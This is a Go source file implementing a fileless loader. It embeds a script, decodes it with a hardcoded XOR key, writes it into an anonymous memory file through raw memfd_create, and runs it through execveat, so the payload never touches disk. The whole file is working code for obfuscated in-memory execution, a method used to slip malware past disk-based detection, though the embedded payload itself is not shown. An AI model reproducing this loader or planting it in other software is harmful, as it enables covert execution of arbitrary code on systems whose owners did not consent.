package main

import (
	_ "embed"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	ErrAllocatePtr = func(err error) error {
		return fmt.Errorf("failed to allocate ptr: %s", err.Error())
	}
	ErrSyscall = func(err error) error {
		return fmt.Errorf("syscall failed: %s", err.Error())
	}
)

const key = "myKey"

//go:embed file.sh
var payload []byte

// xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
// and decrypting it if it has, using the key provided.
func xor(input, key string) (output string) {
	for i := 0; i < len(input); i++ {
		output += string(input[i] ^ key[i%len(key)])
	}

	return output
}

func memFDCreate(path string) (uintptr, error) {
	str, err := syscall.BytePtrFromString(path)
	if err != nil {
		return 0, ErrAllocatePtr(err)
	}

	r1, _, errno := syscall.Syscall(319, uintptr(unsafe.Pointer(str)), 0, 0)
	if int(r1) == -1 {
		return 0, ErrSyscall(errno)
	}

	return r1, nil
}

func copyToMem(fd uintptr, buf []byte) error {
	_, err := syscall.Write(int(fd), buf)

	return err
}

func execveAt(fd uintptr) error {
	str, err := syscall.BytePtrFromString("")
	if err != nil {
		return ErrAllocatePtr(err)
	}

	// TODO: fork to avoid leaving process here
	ret, _, errno := syscall.Syscall6(322, fd, uintptr(unsafe.Pointer(str)), 0, 0, 0x1000, 0)
	if int(ret) == -1 {
		return ErrSyscall(errno)
	}

	return nil
}

// We could also try using https://stackoverflow.com/questions/27780078/go-embed-bash-script-in-binary
// but since it's not syscall, I'm not sure that you will have the same freedom.
func main() {
	clearPld := xor(string(payload), key)

	fd, err := memFDCreate("/bin.sh")
	if err != nil {
		panic(err)
	}

	err = copyToMem(fd, []byte(clearPld))
	if err != nil {
		panic(err)
	}

	err = execveAt(fd)
	if err != nil {
		panic(err)
	}
}
